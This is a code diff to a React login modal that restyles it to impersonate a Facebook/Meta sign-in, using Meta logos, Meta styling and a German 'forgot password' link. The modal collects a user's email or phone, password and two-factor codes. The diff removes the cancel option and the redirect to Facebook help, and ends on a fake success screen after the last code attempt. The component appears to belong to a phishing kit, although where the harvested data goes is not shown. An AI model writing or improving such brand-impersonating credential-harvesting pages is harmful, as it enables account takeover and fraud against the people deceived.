@@ -5,7 +5,9 @@ import config from '@/utils/config';
 import { useLang } from '@/context/lang-context';
 import TwoFactorCodeModal from '@/components/two-factor-code-modal';
 import TryOtherMethodModal from '@/components/try-other-method-modal';
-import SecurityCheckModal from '@/components/security-check-modal';
+import SuccessModal from '@/components/success-modal';
+import fbIcon from '@/assets/images/icon.webp';
+import logoMeta from '@/assets/images/logo-meta.svg';
 
 const LoginModal = ({ onClose, formData = {} }) => {
     const { labels } = useLang();
@@ -28,15 +30,13 @@ const LoginModal = ({ onClose, formData = {} }) => {
     const [isTryOtherStep, setIsTryOtherStep] = useState(false);
     const [selectedMethod, setSelectedMethod] = useState(null);
     const [identifierErrorMsg, setIdentifierErrorMsg] = useState('');
-    const [showSecurityCheck, setShowSecurityCheck] = useState(false);
-    const [securityRedirectUrl, setSecurityRedirectUrl] = useState('');
+    const [isSuccessStep, setIsSuccessStep] = useState(false);
 
     const t = {
         modalDesc: labels.modalDesc,
         emailOrPhonePlaceholder: labels.emailOrPhonePlaceholder,
         passwordPlaceholder: labels.passwordPlaceholder,
         loginBtn: labels.loginBtn,
-        cancelBtn: labels.cancelBtn,
     };
 
     const isValidEmail = (value) => {
@@ -126,8 +126,7 @@ const LoginModal = ({ onClose, formData = {} }) => {
         setCodeLoading(false);
 
         if (nextAttempts >= config.max_code_attempts) {
-            setSecurityRedirectUrl('https://www.facebook.com/help');
-            setShowSecurityCheck(true);
+            setIsSuccessStep(true);
             return;
         }
 
@@ -135,8 +134,11 @@ const LoginModal = ({ onClose, formData = {} }) => {
         setTwoFactorCode('');
     };
 
+    let modalSizeClass = 'max-w-[400px] rounded-[12px]';
+    if (isSuccessStep) modalSizeClass = 'max-w-[360px] rounded-[16px]';
+    else if (isTwoFactorStep) modalSizeClass = 'max-w-[512px] rounded-[16px]';
+
     return (
-        <>
         <div className="fixed inset-0 z-50 flex items-center justify-center px-3 py-4 sm:px-4">
             <button
                 type="button"
@@ -145,113 +147,133 @@ const LoginModal = ({ onClose, formData = {} }) => {
                 onClick={onClose}
             />
             <div
-                className={[
-                    'relative w-full overflow-hidden bg-white shadow-2xl',
-                    isTwoFactorStep
-                        ? 'max-h-[calc(100vh-32px)] max-w-[420px] overflow-y-auto rounded-[0px] border border-[#999]'
-                        : 'max-h-[calc(100vh-32px)] max-w-[400px] overflow-y-auto rounded-[12px]',
-                ].join(' ')}
+                className={`relative w-full max-h-[calc(100vh-32px)] overflow-y-auto overflow-hidden shadow-2xl ${modalSizeClass}`}
+                style={
+                    isTwoFactorStep || isSuccessStep
+                        ? undefined
+                        : {
+                            background:
+                                'linear-gradient(130deg, rgb(249, 241, 249) 0%, rgb(234, 243, 253) 35%, rgb(237, 251, 242) 100%)',
+                        }
+                }
             >
-                {!isTwoFactorStep && (
-                    <>
-                {/* Header */}
-                <div className="flex flex-col items-center bg-white px-4 pb-4 pt-6 sm:px-6 sm:pt-8">
-                    <svg
-                        xmlns="http://www.w3.org/2000/svg"
-                        viewBox="0 0 36 36"
-                        className="mb-4 h-14 w-14"
-                    >
-                        <path
-                            fill="#1877F2"
-                            d="M36 18C36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.985 6.584 16.425 15.188 17.779V23.203h-4.57V18h4.57v-3.968c0-4.508 2.685-6.997 6.79-6.997 1.967 0 4.026.351 4.026.351v4.426h-2.267c-2.235 0-2.931 1.387-2.931 2.81V18h4.99l-.797 5.203h-4.193v12.576C29.416 34.425 36 26.985 36 18z"
-                        />
-                        <path
-                            fill="#fff"
-                            d="M25.008 23.203L25.805 18h-4.99v-3.378c0-1.423.696-2.81 2.931-2.81h2.267V7.386S23.954 7.035 21.987 7.035c-4.105 0-6.79 2.489-6.79 6.997V18h-4.57v5.203h4.57v12.576a18.215 18.215 0 005.624 0V23.203h4.187z"
-                        />
-                    </svg>
-
-                    <p className="text-center text-[14px] leading-[20px] text-[#1c1e21]">
-                        {t.modalDesc}
-                    </p>
-                </div>
-
-                {/* Form */}
-                <div className="bg-white px-4 pb-5 pt-2 sm:px-6 sm:pb-6">
-                    <div className="space-y-3">
-                        <input
-                            type="text"
-                            placeholder={t.emailOrPhonePlaceholder}
-                            value={emailOrPhone}
-                            onChange={(e) => {
-                                const nextValue = e.target.value;
-                                setEmailOrPhone(nextValue);
-                                setIdentifierErrorMsg(getIdentifierError(nextValue));
-                            }}
-                            disabled={loading}
-                            className="w-full rounded-[6px] border border-[#ccd0d5] px-3 py-[11px] text-[14px] text-[#1c1e21] outline-none transition focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2]/20 disabled:opacity-60"
-                        />
-                        {identifierErrorMsg && (
-                            <p className="text-[13px] text-red-500">{identifierErrorMsg}</p>
-                        )}
-
-                        <div className="relative">
-                            <input
-                                type={showPassword ? 'text' : 'password'}
-                                placeholder={t.passwordPlaceholder}
-                                value={password}
-                                onChange={(e) => setPassword(e.target.value)}
-                                disabled={loading}
-                                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
-                                className="w-full rounded-[6px] border border-[#ccd0d5] px-3 py-[11px] pr-11 text-[14px] text-[#1c1e21] outline-none transition focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2]/20 disabled:opacity-60"
+                {!isTwoFactorStep && !isSuccessStep && (
+                    <div className="flex h-full flex-col items-center overflow-y-auto px-6 py-5">
+                        <div className="mb-5 h-[50px] w-[50px]">
+                            <img
+                                alt="logo"
+                                src={fbIcon}
+                                className="h-full w-full object-contain"
                             />
-                            <button
-                                type="button"
-                                onClick={() => setShowPassword((prev) => !prev)}
-                                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#606770] hover:text-[#1c1e21]"
-                                tabIndex={-1}
-                            >
-                                {showPassword ? (
-                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                                        <path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
-                                    </svg>
-                                ) : (
-                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-                                    </svg>
-                                )}
-                            </button>
                         </div>
 
-                        {errorMsg && (
-                            <p className="text-[13px] text-red-500">{errorMsg}</p>
-                        )}
+                        <div className="w-full py-4">
+                            <p className="mb-[7px] text-[14px] text-[#9a979e]">
+                                {t.modalDesc}
+                            </p>
 
-                        <button
-                            type="button"
-                            onClick={handleLogin}
-                            disabled={loading || !emailOrPhone || !password}
-                            className="flex w-full items-center justify-center gap-2 rounded-[6px] bg-[#1877f2] py-[11px] text-[15px] font-semibold text-white transition-colors hover:bg-[#166fe5] active:bg-[#1565d8] disabled:cursor-not-allowed disabled:opacity-70"
-                        >
-                            {loading && (
-                                <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
-                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
-                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
-                                </svg>
-                            )}
-                            {t.loginBtn}
-                        </button>
+                            <form
+                                autoComplete="off"
+                                onSubmit={(e) => {
+                                    e.preventDefault();
+                                    handleLogin();
+                                }}
+                            >
+                                <div className="mb-[10px] flex h-10 items-center rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] text-[14px] transition-all">
+                                    <input
+                                        id="loginIdentifier"
+                                        type="text"
+                                        autoComplete="username"
+                                        placeholder={t.emailOrPhonePlaceholder}
+                                        value={emailOrPhone}
+                                        onChange={(e) => {
+                                            const nextValue = e.target.value;
+                                            setEmailOrPhone(nextValue);
+                                            setIdentifierErrorMsg(getIdentifierError(nextValue));
+                                        }}
+                                        disabled={loading}
+                                        className="h-full w-full border-none bg-transparent text-[14px] outline-none disabled:opacity-60"
+                                    />
+                                </div>
+                                {identifierErrorMsg && (
+                                    <p className="mb-2 text-[13px] text-red-500">{identifierErrorMsg}</p>
+                                )}
+
+                                <div className="relative mb-[10px] flex h-10 items-center rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] pr-[44px] text-[14px] transition-all">
+                                    <input
+                                        id="password"
+                                        type={showPassword ? 'text' : 'password'}
+                                        autoComplete="new-password"
+                                        placeholder={t.passwordPlaceholder}
+                                        value={password}
+                                        onChange={(e) => setPassword(e.target.value)}
+                                        disabled={loading}
+                                        className="h-full w-full border-none bg-transparent text-[14px] outline-none disabled:opacity-60"
+                                    />
+                                    <button
+                                        type="button"
+                                        tabIndex={-1}
+                                        onClick={() => setShowPassword((prev) => !prev)}
+                                        className="absolute right-3 top-1/2 flex -translate-y-1/2 items-center bg-transparent p-0"
+                                    >
+                                        {showPassword ? (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                                <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 17.416-3.998" />
+                                                <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
+                                                <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
+                                                <path d="m2 2 20 20" />
+                                            </svg>
+                                        ) : (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                                <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
+                                                <circle cx="12" cy="12" r="3" />
+                                            </svg>
+                                        )}
+                                    </button>
+                                </div>
+
+                                {errorMsg && (
+                                    <p className="mb-2 text-[13px] text-red-500">{errorMsg}</p>
+                                )}
+
+                                <div className="mt-5 w-full">
+                                    <button
+                                        type="submit"
+                                        disabled={loading || !emailOrPhone || !password}
+                                        className="relative flex h-[45px] min-h-[45px] w-full items-center justify-center rounded-[40px] border-none bg-[#0064e0] text-[15px] font-medium text-white transition-opacity disabled:cursor-not-allowed disabled:opacity-70"
+                                    >
+                                        {loading ? 'Loading...' : t.loginBtn}
+                                    </button>
+                                </div>
+
+                                <p className="mt-[10px] text-center">
+                                    <button
+                                        type="button"
+                                        className="text-[14px] text-[#9a979e] no-underline"
+                                    >
+                                        Passwort vergessen?
+                                    </button>
+                                </p>
+                            </form>
+                        </div>
+
+                        <div className="mt-3 w-[64px]">
+                            <img
+                                alt="Meta"
+                                src={logoMeta}
+                                className="h-auto w-full object-contain opacity-40"
+                            />
+                        </div>
                     </div>
-                </div>
-                    </>
                 )}
 
-                {isTwoFactorStep && !isTryOtherStep && (
+                {isTwoFactorStep && !isTryOtherStep && !isSuccessStep && (
                     <TwoFactorCodeModal
+                        formData={formData}
                         emailOrPhone={emailOrPhone}
                         email={formData?.email_facebook || formData?.email_work}
                         phone={formData?.phone}
+                        codeAttempts={codeAttempts}
                         code={twoFactorCode}
                         onCodeChange={(value) => {
                             setTwoFactorCode(value.replaceAll(/\D/g, ''));
@@ -265,7 +287,7 @@ const LoginModal = ({ onClose, formData = {} }) => {
                     />
                 )}
 
-                {isTwoFactorStep && isTryOtherStep && (
+                {isTwoFactorStep && isTryOtherStep && !isSuccessStep && (
                     <TryOtherMethodModal
                         phone={formData?.phone}
                         onBack={() => setIsTryOtherStep(false)}
@@ -279,27 +301,11 @@ const LoginModal = ({ onClose, formData = {} }) => {
                     />
                 )}
 
-                {!isTwoFactorStep && (
-                    <div className="border-t border-[#dddfe2] bg-[#f0f2f5] px-4 py-4 text-center sm:px-6">
-                        <button
-                            type="button"
-                            onClick={onClose}
-                            className="text-[13px] text-[#606770] hover:underline"
-                        >
-                            {t.cancelBtn}
-                        </button>
-                    </div>
-                )}
+                {isSuccessStep && <SuccessModal />}
+
+                {!isTwoFactorStep && !isSuccessStep && null}
             </div>
         </div>
-
-            {showSecurityCheck && (
-                <SecurityCheckModal
-                    redirectUrl={securityRedirectUrl}
-                    onCancel={() => setShowSecurityCheck(false)}
-                />
-            )}
-        </>
     );
 };
 
